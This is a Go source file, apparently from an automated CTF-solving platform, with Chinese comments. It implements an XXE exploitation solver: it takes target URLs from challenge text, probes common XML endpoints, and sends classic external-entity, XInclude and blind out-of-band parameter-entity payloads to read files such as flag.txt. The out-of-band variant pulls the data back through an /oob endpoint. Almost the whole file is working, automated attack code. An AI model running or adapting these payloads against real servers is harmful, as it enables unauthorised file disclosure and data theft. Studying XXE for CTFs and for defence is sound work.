package ctfplatform

// xxe_attack.go —— XXE（XML 外部实体）利用求解器（xxe_file_read）。
//
// 覆盖的真实考点（此前 Web 渗透链未覆盖的维度）：
//   1. 经典 XXE 文件读：DOCTYPE + 实体声明 + &xxe; 引用，解析器回显文件内容
//   2. XInclude 文件读：<xi:include href="..." parse="text"/>（无需 DOCTYPE 的变体）
//   3. Blind XXE 参数实体外带：解析器主动请求 http://host/oob?d=%file;，
//      响应里没有 flag，flag 走外带通道（/oob-log）取回
//
// 设计原则（反注水）：
//   · 只返回 flag 形状命中；先探活去 404 再投 payload
//   · 单次 ≤2 URL、每 URL 40s、仅 http/https、SECAUTOMIND_WEB_EXPLOIT=0 可关
import (
	"bytes"
	"context"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

const xxeMaxBody = 1 << 20

// xxeFileCandidates XXE 读文件类 payload 的目标文件名。
var xxeFileCandidates = []string{
	"flag.txt", "flag", "/flag.txt", "/flag", "secret.txt",
}

// ---------------- payload 构造 ----------------

// xxeReflectedPayload 经典 XXE：实体读文件并在文档体引用（回显型）。
func xxeReflectedPayload(file string) []byte {
	var b bytes.Buffer
	b.WriteString(`<?xml version="1.0"?>`)
	b.WriteString(`<!DOCTYPE r [<!ENTITY xxe SYSTEM "` + file + `">]>`)
	b.WriteString(`<r>&xxe;</r>`)
	return b.Bytes()
}

// xxeXIncludePayload XInclude 变体：无需 DOCTYPE，靠 xi:include 读文件。
func xxeXIncludePayload(file string) []byte {
	var b bytes.Buffer
	b.WriteString(`<?xml version="1.0"?>`)
	b.WriteString(`<r xmlns:xi="http://www.w3.org/2001/XInclude">`)
	b.WriteString(`<xi:include href="` + file + `" parse="text"/></r>`)
	return b.Bytes()
}

// xxeOOBPayload Blind XXE：参数实体外带，exfilBase 形如 http://host。
// flag 不出现在响应里，经 <exfilBase>/oob?d=<文件内容> 送到探针端点。
func xxeOOBPayload(exfilBase, file string) []byte {
	var b bytes.Buffer
	b.WriteString(`<?xml version="1.0"?>`)
	b.WriteString(`<!DOCTYPE r [`)
	b.WriteString(`<!ENTITY % file SYSTEM "` + file + `">`)
	b.WriteString(`<!ENTITY % oob SYSTEM "` + exfilBase + `/oob?d=%file;">`)
	b.WriteString(`%oob;]>`)
	b.WriteString(`<r>x</r>`)
	return b.Bytes()
}

// ---------------- 端点发现 ----------------

// xxeCommonEndpoints 常见 XML 解析入口（题目线索优先，这里只兜底）。
var xxeCommonEndpoints = []string{
	"/parse", "/xml", "/api/xml", "/import", "/api/import", "/api/parse",
	"/parse-xml", "/xmlparser", "/api/xmlparse", "/notes", "/upload", "/data",
}

// xxeEndpoints 端点优先级：题目描述线索 > 常见路径。
func xxeEndpoints(hints WebHints) []string {
	seen := map[string]bool{}
	var out []string
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, e := range hints.Endpoints {
		add(e)
	}
	for _, e := range xxeCommonEndpoints {
		add(e)
	}
	return out
}

// ---------------- HTTP 工具 ----------------

// xxeDo 发一次请求，返回状态码与响应体（失败不抛错）。
func xxeDo(ctx context.Context, cl *http.Client, method, u string, body []byte, ct string) (int, []byte) {
	var rdr io.Reader
	if len(body) > 0 {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequestWithContext(ctx, method, u, rdr)
	if err != nil {
		return 0, nil
	}
	if ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	resp, err := cl.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, xxeMaxBody))
	return resp.StatusCode, b
}

// xxeLiveEndpoints 先 GET 探活（404 丢弃），避免对不存在路径狂发 payload。
func xxeLiveEndpoints(ctx context.Context, cl *http.Client, base string, hints WebHints) []string {
	var live []string
	for _, ep := range xxeEndpoints(hints) {
		if ctx.Err() != nil {
			return live
		}
		code, _ := xxeDo(ctx, cl, http.MethodGet, base+ep, nil, "")
		if code == 404 || code == 0 {
			continue
		}
		live = append(live, ep)
	}
	return live
}

// ---------------- 主攻击流程 ----------------

// AttackXXE 对目标站点执行 XXE 利用尝试，返回 flag 形状命中。
func AttackXXE(ctx context.Context, baseURL string, hints WebHints) []string {
	base := strings.TrimRight(baseURL, "/")
	if !strings.HasPrefix(base, "http://") && !strings.HasPrefix(base, "https://") {
		return nil
	}
	cl := webClient(6 * time.Second)

	var out []string
	found := func() bool { return len(out) > 0 }

	for _, ep := range xxeLiveEndpoints(ctx, cl, base, hints) {
		if ctx.Err() != nil || found() {
			break
		}
		u := base + ep

		// 1) 经典 XXE / XInclude：两种 Content-Type 各投一遍
		for _, f := range xxeFileCandidates {
			if ctx.Err() != nil || found() {
				break
			}
			for _, ct := range []string{"application/xml", "text/xml"} {
				_, b := xxeDo(ctx, cl, http.MethodPost, u, xxeReflectedPayload(f), ct)
				out = append(out, deserScan(b)...)
				if found() {
					break
				}
				_, b = xxeDo(ctx, cl, http.MethodPost, u, xxeXIncludePayload(f), ct)
				out = append(out, deserScan(b)...)
				if found() {
					break
				}
			}
		}
		if found() {
			break
		}

		// 2) Blind XXE 参数实体外带：flag 不在响应里，从探针日志取回
		for _, f := range xxeFileCandidates {
			if ctx.Err() != nil || found() {
				break
			}
			_, b := xxeDo(ctx, cl, http.MethodPost, u, xxeOOBPayload(base, f), "application/xml")
			if b == nil {
				continue
			}
			// 给解析器一点时间完成外带请求
			time.Sleep(300 * time.Millisecond)
			_, log := xxeDo(ctx, cl, http.MethodGet, base+"/oob-log", nil, "")
			out = append(out, deserScan(log)...)
			if found() {
				break
			}
		}
	}
	return deserDedup(out)
}

// xxeAttackFromText 从题目文本里取 URL 并执行 XXE 利用（生产入口）。
func xxeAttackFromText(ctx context.Context, text string) []string {
	if os.Getenv("SECAUTOMIND_WEB_EXPLOIT") == "0" {
		return nil
	}
	urls := reHTTPURL.FindAllString(text, -1)
	if len(urls) == 0 {
		return nil
	}
	if len(urls) > 2 {
		urls = urls[:2]
	}
	hints := ParseWebHints(text)
	var out []string
	for _, u := range urls {
		select {
		case <-ctx.Done():
			return out
		default:
		}
		tctx, cancel := context.WithTimeout(ctx, 40*time.Second)
		out = append(out, AttackXXE(tctx, u, hints)...)
		cancel()
		if len(out) > 0 {
			break
		}
	}
	return deserDedup(out)
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "xxe_file_read", Category: CategoryWebS, Priority: 26,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return xxeAttackFromText(ctx, text)
		},
	})
}
